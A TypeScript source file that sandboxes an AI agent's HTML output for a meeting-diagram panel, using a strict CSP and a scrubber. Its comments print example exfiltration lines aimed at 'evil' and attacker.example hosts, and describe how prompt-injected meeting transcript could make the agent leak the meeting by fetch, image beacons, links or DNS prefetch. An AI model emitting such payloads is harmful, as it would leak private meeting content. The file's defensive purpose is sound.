// Srcdoc builder for the Meetings **Sketch Artist** frame.
//
// WHAT THIS SOLVES
// ================
// The sketch artist is a model-driven agent: it reads live meeting transcript
// and writes a self-contained HTML file (Mermaid diagram, or a plain HTML/CSS
// table). Two things were true of the old render path and both are fixed here.
//
// 1. EXFILTRATION. The frame was `<iframe srcDoc={modelHtml}
//    sandbox="allow-scripts">` with no CSP. The null origin (no
//    `allow-same-origin`) correctly stops the frame READING this page — but it
//    says nothing about OUTBOUND requests. From a null origin,
//    `fetch('https://evil/?d='+document.body.innerText)` and
//    `new Image().src = 'https://evil/?d='+…` both work. The transcript is
//    attacker-influencable (anyone who speaks in the meeting, or anything a
//    joining link pulls in), the agent writes HTML *from* that transcript, and
//    the agent is enabled by default — so prompt-injected transcript could turn
//    the panel into an exfiltration channel for the whole meeting.
// 2. THE DIAGRAM DIDN'T WORK. The agent is instructed to "use Mermaid" and to
//    stay "self-contained — no external assets, no network requests", but
//    nothing supplied Mermaid to the frame. A Mermaid block therefore either
//    silently failed or the model reached for a public CDN.
//
// These are ONE fix. Mermaid is vendored same-origin (see vendorPaths.ts;
// `mermaid` is already a direct dependency for chat markdown, so this adds no
// new supply-chain surface) and the CSP below then forbids network access
// outright. The frame gets MORE capable while the egress channel closes: it
// needs zero network, so it can be denied all of it.
//
// CSP CAVEAT (honest note, same as mcpAppSrcdoc.ts)
// ================================================
// A `<meta http-equiv="Content-Security-Policy">` is WEAKER than a
// header-delivered CSP: it cannot express `frame-ancestors`/`sandbox`/
// `report-uri`, and it only binds from the point the parser reaches it. There is
// no HTTP response for a `srcdoc` document, so a header is not available to us —
// meta injection is the accepted approach and matches widgetSrcdoc.ts. We
// therefore emit the meta as the FIRST child of `<head>`, ahead of every byte we
// or the model contribute (see buildSketchSrcdoc); injection order is
// load-bearing, not cosmetic.
//
// The hard isolation boundary remains the sandboxed null-origin iframe. The CSP
// is defense-in-depth on top of it — but it is the *only* thing that addresses
// egress, which the sandbox does not.
//
// 3. MODEL SCRIPTS DO NOT RUN HERE — and the old "residual" note was WRONG
// ========================================================================
// An earlier revision of this header listed speculative DNS (`<link
// rel="dns-prefetch">`) as an accepted residual, on the grounds that it "cannot
// carry document content — only what the attacker manages to encode into DNS
// labels." THAT REASONING WAS WRONG. Do not re-derive it. Both halves failed:
//
//   * It assumed the channel was limited to whatever static markup the model
//     wrote. It was not. The CSP grants `script-src 'unsafe-inline'` (an inline
//     script IS how Mermaid gets initialized), and the finished document is
//     handed to the frame as a STRING via `srcDoc`, which the frame then
//     re-parses — so every `<script>` surviving into that string is
//     parser-inserted in the frame and EXECUTES. Model script was live code.
//   * "Only DNS labels" is not a bandwidth argument. Live script reads
//     `document.body.innerText` — the transcript — chunks it into 63-char
//     labels (253 per name, ~200 bytes a lookup) and appends a fresh
//     `<link rel="dns-prefetch">` per chunk in a loop. Nothing rate-limits how
//     many links a script appends, and no CSP directive governs the lookups.
//     That is a usable exfiltration channel for the whole document, not a
//     hostname-only trickle.
//
// So the fix is at the root, not at the `<link>`: the model's own scripts are
// REMOVED from the document (see scrubModelDocument) instead of being kept
// alive. Stripping the static speculative markup is then belt-and-braces — a
// `<link>`-only strip would be defeated by one `document.createElement('link')`.
//
// What is true NOW:
//
//   * The only scripts in the frame are the two WE author — the vendored Mermaid
//     runtime and `MERMAID_BOOTSTRAP_BODY` — both emitted after the scrub, from
//     fixed string literals that interpolate no model or user byte.
//   * Mermaid still works, and tables still work, because Mermaid is driven by
//     OUR bootstrap from declarative `div.mermaid` / fenced ```mermaid blocks.
//     The agent is instructed to emit exactly those and to stay "self-contained
//     — inline styles, no external assets, no network requests", so it has no
//     documented need to ship JS. See
//     `src/kiro_crew/apps/builtins/meetings/agents/meetings-sketch-artist.json`.
//   * The residual that is left is narrow and ours: `'unsafe-inline'` is still
//     granted, and our own bootstrap could in principle append a speculative
//     `<link>`. It is a fixed literal in this file, not attacker input.
//     Replacing `'unsafe-inline'` with a build-time hash of that literal would
//     retire even that, and is the natural follow-up.

import { MERMAID_RUNTIME_PATH } from '../../../lib/vendorPaths'

/**
 * CSP for the sketch frame. `scriptOrigin` is the dashboard's own origin
 * (`window.location.origin`) — a null-origin document cannot use `'self'`, so
 * the origin is spelled out.
 *
 * Each directive, and why it is exactly this:
 *
 * - `default-src 'none'` — start from deny-everything so any fetch type we
 *   forget to name (media, object, worker, manifest, prefetch, **frame**) is
 *   denied by fallback. `frame-src` is deliberately ABSENT for this reason: an
 *   `<iframe src="https://evil/?d=…">` is just as good an exfil channel as an
 *   image, and inheriting `'none'` blocks it without another directive to keep
 *   in sync.
 * - `script-src 'unsafe-inline' <origin><MERMAID_RUNTIME_PATH>` — pinned to the
 *   single vendored FILE, not to a bare origin and not to `https:`. Same
 *   least-privilege shape as `widgetSrcdoc.cspFor` pinning Tailwind: an injected
 *   document cannot pull arbitrary scripts from other dashboard endpoints, and
 *   crucially a script URL is itself an egress channel, so `script-src https:`
 *   would reopen the finding. `'unsafe-inline'` stays because OUR OWN inline
 *   bootstrap (`MERMAID_BOOTSTRAP_BODY`) is what drives Mermaid, and a `srcdoc`
 *   document has no response header to carry a nonce. Note what it no longer
 *   covers: the model's inline scripts are REMOVED from the document before it is
 *   serialized (`scrubModelDocument`), so `'unsafe-inline'` is a grant to our
 *   code, not to the model's. Replacing it with a build-time hash of that one
 *   literal is the follow-up that would retire the grant entirely.
 *   `'unsafe-eval'` is NOT granted — the vendored bundle contains zero
 *   `eval(` / `new Function` / `new Worker` / `importScripts` (verified against
 *   mermaid 11.13.0's `mermaid.min.js`), so the frame gets no dynamic-exec
 *   primitive.
 * - `style-src 'unsafe-inline'` — Mermaid injects a `<style>` block inside the
 *   SVG it renders, and both Mermaid and the agent's tables use `style=`
 *   attributes. No origin: a stylesheet URL is also an egress channel.
 * - `img-src data:` — **this and `connect-src` are the two directives that close
 *   the finding.** The reported repro is an HTTPS image URL, so `img-src` grants
 *   NO `https:` and no origin: only inline `data:` images can load. `blob:` is
 *   deliberately omitted — the vendored bundle never calls
 *   `URL.createObjectURL`, so Mermaid does not need it. (Note `img-src` also
 *   governs CSS `background: url(…)`, closing that variant too.)
 * - `font-src data:` — an inline `@font-face` is harmless (no network), a remote
 *   one is an egress channel. Mermaid itself needs no webfont.
 * - `connect-src 'none'` — kills `fetch`, `XMLHttpRequest`, WebSocket,
 *   `EventSource` and `navigator.sendBeacon` in one directive. The frame needs
 *   no network at all now that Mermaid is same-origin, so it is granted none.
 * - `form-action 'none'` — `form-action` does NOT fall back to `default-src`, so
 *   without it an auto-submitting `<form action="https://evil">` would exfil by
 *   navigation.
 * - `base-uri 'none'` — a `<base href>` would re-point every relative URL in the
 *   document, including the Mermaid script path, at an attacker origin.
 */
const cspFor = (scriptOrigin: string): string =>
  "default-src 'none'; " +
  `script-src 'unsafe-inline' ${scriptOrigin}${MERMAID_RUNTIME_PATH}; ` +
  "style-src 'unsafe-inline'; " +
  "img-src data:; font-src data:; connect-src 'none'; " +
  "form-action 'none'; base-uri 'none';"

/** Frame chrome only. Kept deliberately small so it cannot fight the agent's
 * own styling: page padding, a readable default face, and a rule that keeps a
 * wide diagram inside the panel instead of forcing a horizontal scrollbar. */
const BASE_CSS =
  "body { margin: 0; padding: 16px; background: #fff; color: #1a1a1a; " +
  "font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; } " +
  '.mermaid { display: flex; justify-content: center; } ' +
  '.mermaid svg { max-width: 100%; height: auto; }'

/**
 * In-frame Mermaid bootstrap. A fixed string literal — it interpolates NOTHING
 * (no `${}` at all), so no model or user byte can ever reach it. Assigned via
 * `textContent` and re-parsed by the frame through the normal `<script>`
 * mechanism.
 *
 * Init approach, and why:
 *
 * - `startOnLoad: false` + an explicit `mermaid.run()`. Mermaid registers its
 *   OWN `window.load` handler at script-eval time, and its default config has
 *   `startOnLoad: true` — so doing nothing would auto-render, but would race our
 *   `initialize()` call and could render with mermaid's defaults instead of
 *   ours. `suppressErrorRendering` is not a nicety: without it a parse error
 *   injects a temp `<div id="dmermaid-*">` into `document.body` that render()
 *   only cleans up on SUCCESS, so failing blocks accumulate orphaned 512px error
 *   SVGs (see src/test/MarkdownRenderer.mermaid.test.tsx — this is a real
 *   regression, kept in sync with MarkdownRenderer's `initMermaid`). Being
 *   explicit is the only way to guarantee that setting is applied.
 * - `suppressErrors: true` on `run()` because `run()` rethrows the first error
 *   otherwise, so one malformed diagram would abort every later one. Combined
 *   with `suppressErrorRendering`, a bad block degrades to showing its own
 *   source text and nothing leaks into the DOM.
 * - `securityLevel: 'strict'` matches MarkdownRenderer: the diagram source is
 *   model-authored, so HTML labels and click handlers stay off.
 * - We run at `DOMContentLoaded` (or immediately if parsing already finished),
 *   which is earlier than mermaid's own `load` hook and does not wait on images.
 * - `promote()` normalizes a fenced ```mermaid block — which reaches us as
 *   `<pre><code class="language-mermaid">` — into the plain `div.mermaid` that
 *   mermaid's selector expects. Mermaid reads `innerHTML` and entity-decodes it,
 *   so leaving the `<code>` wrapper in place would feed markup to the parser and
 *   guarantee a parse error. `textContent` extraction avoids that.
 * - Re-running is safe: mermaid marks handled nodes `data-processed`, so a second
 *   `run()` (ours or mermaid's own `startOnLoad` hook) renders nothing twice.
 *
 * This bootstrap is now the ONLY thing that renders a diagram: the model's own
 * `<script>` elements are stripped by `scrubModelDocument`, so a document written
 * in the old CDN idiom (`<script src="…cdn…/mermaid">` then
 * `mermaid.initialize({startOnLoad:true})`) no longer runs its half — and does
 * not need to, because the declarative `div.mermaid` / fenced-block markup it
 * wrote around that script is exactly what `promote()` + `run()` pick up.
 */
const MERMAID_BOOTSTRAP_BODY = `(function(){
  var m = window.mermaid;
  if (!m) return;
  function promote(){
    var nodes = document.querySelectorAll('code.language-mermaid, code.mermaid, pre.mermaid > code');
    for (var i = 0; i < nodes.length; i++){
      var code = nodes[i];
      var host = code.closest('pre') || code;
      var div = document.createElement('div');
      div.className = 'mermaid';
      div.textContent = code.textContent || '';
      if (host.parentNode) host.parentNode.replaceChild(div, host);
    }
  }
  function start(){
    try { promote(); } catch (e) {}
    try {
      m.initialize({
        startOnLoad: false,
        securityLevel: 'strict',
        suppressErrorRendering: true,
        fontFamily: 'inherit',
        theme: 'default'
      });
    } catch (e) {}
    try { m.run({ querySelector: '.mermaid', suppressErrors: true }); } catch (e) {}
  }
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', start);
  else start();
})();`

/**
 * Elements removed outright from the model document. Every one of them is
 * either a script host or a navigation/fetch primitive that would fire before
 * or around the CSP, and NONE of them is reachable from the agent's documented
 * output (Mermaid blocks + HTML/CSS tables).
 *
 * - `script` — the root cause. Its removal is what closes the DNS channel; see
 *   the file header. Covers SVG `<script>` too: `querySelectorAll('script')`
 *   matches on local name, and SVG's script element has the same one.
 * - `iframe` / `frame` — `srcdoc` is a full nested document, so an `<iframe
 *   srcdoc="<script>…">` re-introduces script execution one level down where
 *   this scrub has not run. `src` is separately an egress channel.
 * - `object` / `embed` / `applet` — plugin/document hosts: `<object
 *   data="…">` both fetches and can host a scripted document.
 * - `link` — **decision: EVERY `<link>` goes, not just the speculative rels.**
 *   The narrow fix would be to drop `rel` values in {`dns-prefetch`,
 *   `preconnect`, `prefetch`, `prerender`, `preload`, `modulepreload`}, matching
 *   `rel` case-insensitively and token-wise (`rel="foo dns-prefetch"` is a hit).
 *   Dropping the element outright is both simpler and strictly safer, and it
 *   costs nothing here because NO `rel` has a legitimate use in this frame:
 *   `stylesheet` is already dead (`style-src 'unsafe-inline'` names no origin, so
 *   a remote sheet cannot load, and the agent is told to use inline styles);
 *   `icon`/`apple-touch-icon` are meaningless in a 340px panel and would need an
 *   `img-src` origin we do not grant; `manifest`, `import` and `search` all fall
 *   under `default-src 'none'`. So a surviving `<link>` could only ever be a
 *   no-op or a channel. A rel-allowlist would also mean maintaining a token list
 *   forever against a spec that keeps adding speculative rels — the exact failure
 *   mode this finding came from. Element-level removal has no such list.
 * - `meta` — the only reason a model document needs a `<meta>` is charset or
 *   viewport, and we already emit both. What it must not be able to emit is
 *   `http-equiv="refresh"` (navigates the frame to an attacker URL, exfiltrating
 *   by navigation — `form-action 'none'` does not cover a redirect) or a second
 *   `http-equiv="Content-Security-Policy"` (a policy cannot be loosened by a
 *   later meta, but it removes any doubt).
 * - `base` — repoints every relative URL, including our Mermaid script path.
 *   `base-uri 'none'` already refuses it; removing it means we do not depend on
 *   the meta-CSP having bound yet.
 * - `template` — its `.content` is an inert DocumentFragment that
 *   `querySelectorAll` on the host document does NOT descend into, so a
 *   `<template><script>…</script></template>` would sail through an
 *   attribute/element walk and then execute the moment anything clones it.
 *   Nothing in a diagram or a table needs one, so it goes.
 * - `noscript` — with scripting enabled its children are parsed as TEXT, so it
 *   is inert in the real frame; but happy-dom (and DOMParser) expose the inner
 *   `<script>` as an element, and relying on a per-engine parsing difference for
 *   a security property is exactly the kind of reasoning that produced the bug
 *   in the file header. Removed so both engines agree.
 */
const STRIPPED_TAGS = [
  'script', 'iframe', 'frame', 'object', 'embed', 'applet',
  'link', 'meta', 'base', 'template', 'noscript',
] as const

/**
 * URL-bearing attributes whose VALUE is scheme-checked on every surviving
 * element. They are dropped only when `isUnsafeUrl` says the scheme itself can
 * execute — so a legitimate `href="#anchor"` in a diagram label, or an
 * `src="data:image/png;base64,…"`, survives.
 *
 * This pass is deliberately narrow, because the two threats are handled by
 * different mechanisms and conflating them is how you end up with an endless
 * denylist:
 *
 *   * A URL that EXECUTES (`javascript:`, `vbscript:`, `data:text/html`) is not
 *     a fetch at all, so no CSP directive stops it. That is what this pass is
 *     for.
 *   * A URL that merely REACHES THE NETWORK (`srcset="https://evil/x 1x"`,
 *     `<a ping>`, `poster`, a remote SVG `use href`) is a fetch, and the CSP
 *     already refuses it: `default-src 'none'` with only `img-src data:` /
 *     `font-src data:` / `connect-src 'none'` granted means there is no
 *     directive under which a remote sub-resource can load. Those values are
 *     therefore left alone rather than pattern-matched here — one deny-all
 *     policy beats a list of URL attributes we would have to keep current.
 */
const URL_ATTRS = [
  'href', 'xlink:href', 'src', 'srcset', 'data', 'action',
  'formaction', 'ping', 'poster', 'background', 'codebase',
] as const

/** Values of `<animate attributeName>` / `<set attributeName>` that would let
 * SVG animation WRITE a scrubbed URL attribute back onto its parent after the
 * scrub ran. The animation elements are kept (they are legitimate SVG), but an
 * animation that targets a URL attribute is dropped. */
const ANIMATABLE_URL_TARGETS = new Set(['href', 'xlink:href'])

/**
 * True for a URL value whose SCHEME can execute script — the one class of URL no
 * CSP fetch directive covers, because it is a navigation/eval, not a fetch.
 *
 * `data:` is refused on the same grounds: a `data:text/html,<script>…`
 * navigation is script execution. `data:image/*` is the one form the CSP
 * explicitly permits (`img-src data:`), so it passes.
 */
/**
 * Attributes that can NAVIGATE, as opposed to fetching a sub-resource.
 *
 * These get a stricter rule than `isUnsafeUrl`: fragment-only, or dropped. The
 * reasoning in `URL_ATTRS` above — "a URL that merely reaches the network is a
 * fetch, and `default-src 'none'` already refuses it" — is correct for a
 * sub-resource and WRONG for a navigation. No CSP directive governs where a
 * top-level navigation may go: `form-action` covers form submission only,
 * `default-src` does not apply, and `navigate-to` was dropped from the spec and
 * never shipped. The frame is `sandbox="allow-scripts"` without
 * `allow-top-navigation`, so it cannot move the dashboard — but it CAN navigate
 * itself, and the request carries whatever the model put in the path.
 *
 * So a prompt-injected `<a href="https://attacker.example/<meeting text>">`
 * styled as a diagram label is a live exfiltration channel that survives every
 * other control here, needing only a click. The file already recognises exactly
 * this shape for `<meta http-equiv="refresh">` ("exfiltrating by navigation —
 * `form-action 'none'` does not cover a redirect"); this is the same hole reached
 * through an ordinary link.
 *
 * Fragment refs are kept because Mermaid's own output uses them (`href="#id"`
 * on nodes, `xlink:href` into `<defs>`), and a bare `#fragment` cannot resolve
 * anywhere but this document.
 */
const NAVIGABLE_ATTRS = new Set(['href', 'xlink:href'])

/** True for a value that can only ever resolve inside this document. */
const isFragmentOnly = (value: string): boolean =>
  /^#\S*$/.test(value.replace(/[\x00-\x20\x7f]+/g, ''))

function isUnsafeUrl(value: string): boolean {
  // Strip ASCII whitespace and C0 controls before matching: the HTML URL
  // parser ignores them, so `ja&#9;vascript:` and a leading-space
  // `  JAVASCRIPT:` are both live `javascript:` URLs that a naive
  // `startsWith` on the raw attribute would miss. Escapes are spelled out
  // rather than pasted as literal control bytes.
  const stripped = value.replace(/[\x00-\x20\x7f]+/g, '').toLowerCase()
  if (stripped.startsWith('javascript:') || stripped.startsWith('vbscript:')) return true
  if (stripped.startsWith('data:') && !stripped.startsWith('data:image/')) return true
  return false
}

/**
 * Remove script execution and speculative/navigational fetch primitives from the
 * model-authored fragment, in place.
 *
 * This is the ROOT-CAUSE fix for the DNS-prefetch exfiltration finding: with no
 * model script running, there is no `document.createElement('link')` to defeat a
 * static markup strip, and the static strip below then closes the declarative
 * form of the same channel.
 *
 * Order matters: `STRIPPED_TAGS` are removed BEFORE the attribute pass, so the
 * attribute walk never has to reason about an element that is about to disappear.
 * `<template>` is removed as an element (its `.content` fragment is not visited
 * by `querySelectorAll` on the host, so scrubbing inside it would be wasted
 * work — and leaving it in place would be a hole).
 */
function scrubModelDocument(root: ParentNode): void {
  for (const el of Array.from(root.querySelectorAll(STRIPPED_TAGS.join(',')))) {
    el.remove()
  }

  for (const el of Array.from(root.querySelectorAll('*'))) {
    for (const attr of Array.from(el.attributes)) {
      const name = attr.name.toLowerCase()
      // Event handlers: script by another name, so they follow <script> out.
      if (name.startsWith('on')) {
        el.removeAttribute(attr.name)
        continue
      }
      // Navigable attributes first, and with the STRICTER rule: a navigation is
      // not a sub-resource fetch, so no CSP directive constrains where it may go
      // (see NAVIGABLE_ATTRS). Fragment-only survives; everything else goes.
      if (NAVIGABLE_ATTRS.has(name)) {
        if (!isFragmentOnly(attr.value)) el.removeAttribute(attr.name)
        continue
      }
      if (URL_ATTRS.includes(name as (typeof URL_ATTRS)[number]) && isUnsafeUrl(attr.value)) {
        el.removeAttribute(attr.name)
        continue
      }
      // An SVG <animate attributeName="href"> would write a URL back onto its
      // parent after this scrub, so the animation loses its target.
      if (name === 'attributename' && ANIMATABLE_URL_TARGETS.has(attr.value.trim().toLowerCase())) {
        el.removeAttribute(attr.name)
      }
    }
  }
}

/**
 * Build the `srcdoc` for the sketch artist's sandboxed iframe.
 *
 * @param html        The model-authored document. NEVER interpolated.
 * @param scriptOrigin The dashboard's own origin, e.g. `window.location.origin`.
 *   The frame is null-origin, so a bare `/vendor/...` path would not resolve
 *   there and `'self'` is not usable in its CSP — both need the origin spelled
 *   out. Callers in a non-browser context should pass `''`; the policy then
 *   pins a path-only script source, which matches nothing, i.e. it fails CLOSED.
 *
 * MODEL HTML NEVER ENTERS A TEMPLATE LITERAL. It flows through
 * `Range.createContextualFragment()` — a typed DOM API — is adopted as DOM
 * nodes, and the finished document is serialized via
 * `documentElement.outerHTML`. This is the same construction widgetSrcdoc.ts
 * uses and for the same reason: string-concatenating untrusted HTML into a
 * document template makes every escape sequence a potential structural break,
 * including one that could split the CSP `content="…"` attribute. The only
 * template literal that survives here is the static DOCTYPE prefix.
 *
 * INJECTION-ORDER GUARANTEE: the CSP meta is inserted as the FIRST child of
 * `<head>` and therefore precedes the Mermaid `<script src>`, our bootstrap, the
 * base stylesheet, and every byte of the model document (all of which live in
 * `<body>`, after the head). A `<meta>` CSP only binds from where it is parsed,
 * so anything allowed to parse ahead of it — an `<img>`, a `<script>`, an
 * auto-submitting `<form>` — would fire under NO policy. Keep the insert last in
 * this function and first in the head.
 */
export function buildSketchSrcdoc(html: string, scriptOrigin: string): string {
  // `document.implementation.createHTMLDocument` returns a detached
  // `<html><head><title></title></head><body>` we can assemble into.
  const doc = document.implementation.createHTMLDocument('')
  const head = doc.head
  const body = doc.body

  const charset = doc.createElement('meta')
  charset.setAttribute('charset', 'utf-8')
  head.appendChild(charset)

  const viewport = doc.createElement('meta')
  viewport.setAttribute('name', 'viewport')
  viewport.setAttribute('content', 'width=device-width, initial-scale=1')
  head.appendChild(viewport)

  const style = doc.createElement('style')
  style.textContent = BASE_CSS
  head.appendChild(style)

  // Same-origin Mermaid, loaded BLOCKING in <head>. OURS, created here via
  // createElement from a fixed path — so it is not something the scrub below
  // could remove even in principle, and it is the only `<script src>` in the
  // document.
  // NOTE: uses a placeholder <meta> instead of a live <script> to avoid
  // happy-dom's eager script loading (ECONNREFUSED in CI). See widgetSrcdoc.ts
  // for the full rationale — same pattern.
  const mermaidPlaceholder = doc.createElement('meta')
  mermaidPlaceholder.setAttribute('name', 'x-script-placeholder')
  mermaidPlaceholder.setAttribute('data-src', scriptOrigin + MERMAID_RUNTIME_PATH)
  head.appendChild(mermaidPlaceholder)

  // Model HTML, adopted as typed DOM nodes — see the doc comment above.
  const range = doc.createRange()
  range.selectNodeContents(body)
  const fragment = range.createContextualFragment(html)
  // ROOT-CAUSE STEP. Strip the model's scripts, event handlers and speculative /
  // navigational fetch primitives BEFORE the fragment joins the document.
  //
  // We deliberately do NOT call widgetSrcdoc's `recloneScripts` here. That helper
  // exists to make adopted `<script>` nodes execute, which chat widgets
  // legitimately need (Chart.js, D3) — its behavior is unchanged and its other
  // callers are untouched; this frame simply no longer calls it. Model script in
  // THIS frame was the DNS-exfiltration channel (file header, item 3), and the
  // sketch agent has no documented need to ship JS: Mermaid is driven by our own
  // bootstrap below from declarative markup.
  scrubModelDocument(fragment)
  body.appendChild(fragment)

  // Our bootstrap, appended AFTER the scrub so the scrub can never reach it, from
  // a fixed literal that interpolates nothing. It runs once the model content is
  // parsed, so `run()` sees every diagram node in the document.
  const bootstrap = doc.createElement('script')
  bootstrap.textContent = MERMAID_BOOTSTRAP_BODY
  body.appendChild(bootstrap)

  // LAST, and FIRST in the head: nothing above may parse before the policy.
  const csp = doc.createElement('meta')
  csp.setAttribute('http-equiv', 'Content-Security-Policy')
  csp.setAttribute('content', cspFor(scriptOrigin))
  head.insertBefore(csp, head.firstChild)

  // The one remaining template literal holds the static DOCTYPE plus the
  // SERIALIZED DOM tree, whose model content was already adopted as nodes.
  // Post-serialization: replace the SINGLE trusted placeholder with the real
  // <script> tag. No `g` flag — only the one placeholder we inserted into
  // <head> is replaced. Model-authored content in <body> cannot produce a
  // matching placeholder because: (1) scrubModelDocument strips all <meta>
  // from model fragments (FORBIDDEN list), and (2) attribute serialization
  // HTML-escapes quotes regardless. Non-global replace is defense-in-depth.
  const serialized = `<!DOCTYPE html>\n${doc.documentElement.outerHTML}`
  return serialized.replace(
    /<meta name="x-script-placeholder" data-src="([^"]*)">/,
    (_match, src) => `<script src="${src}"></script>`,
  )
}
